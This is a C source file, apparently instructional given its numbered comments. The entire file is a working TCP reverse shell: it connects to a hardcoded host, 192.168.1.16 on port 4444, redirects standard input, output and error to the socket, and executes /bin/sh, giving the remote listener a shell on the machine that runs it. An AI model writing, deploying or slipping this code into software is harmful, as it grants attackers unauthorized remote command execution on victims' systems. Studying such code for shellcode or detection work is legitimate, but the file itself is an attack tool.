#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define rhost "192.168.1.16"
#define rport 4444

void main() {
	  /* Allocate a socket for IPv4/TCP (1) */
	  int sock = socket(AF_INET, SOCK_STREAM, 0);

      	  /* Setup the connection structure. (2) */
	  struct sockaddr_in sin;
	  sin.sin_family = AF_INET;
	  sin.sin_port = htons(rport);


	  /* Parse the IP address (3) */
	  inet_pton(AF_INET, rhost, &sin.sin_addr.s_addr);

	  /* Connect to the remote host (4) */
	  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));


	  /* Duplicate the socket to STDIO (5) */
	  dup2(sock, STDIN_FILENO);
	  dup2(sock, STDOUT_FILENO);
	  dup2(sock, STDERR_FILENO);


	  /* Setup and execute a shell. (6) */
	  char *argv[] = {"/bin/sh", NULL};
	  execve("/bin/sh", argv, NULL);
}
